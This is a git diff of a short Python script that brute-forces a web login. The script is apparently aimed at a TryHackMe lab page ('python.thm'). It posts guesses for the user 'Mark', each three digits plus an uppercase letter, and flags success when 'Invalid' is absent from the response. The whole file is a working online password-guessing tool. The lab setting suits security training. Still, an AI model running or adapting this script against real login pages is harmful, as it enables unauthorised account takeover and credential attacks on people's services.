@@ -1,20 +1,25 @@
 # Facilitates sending and receiving HTTP requests from web apps.
-import requests 
+import requests
+import string
 
 # Send post requests to target URL.
-url = "http://someurl.com"
+url = "http://python.thm/labs/lab1/index.php"
 
-username = "someusername"
+username = "Mark"
+password_list = []
 
-# Generating 4-digit numeric passwords (0000 - 9999)
-password_list = [str(i).zfill(4) for i in range (10000)]
+# Generating 4-digit  alphanumeric pins.
+for i in range(1000):
+    password = str(i).zfill(3)
+    for letter in string.ascii_uppercase:
+        password_list += [password + letter]
 
 # Iterates through password list, sending diff. usernames and password combos to server.
 def brute_force():
     for password in password_list:
         data = {"username": username, "password": password}
         response = requests.post(url, data=data)
-        
+
         if "Invalid" not in response.text:
             print(f"[+] Found valid credentials: {username}:{password}")
             break
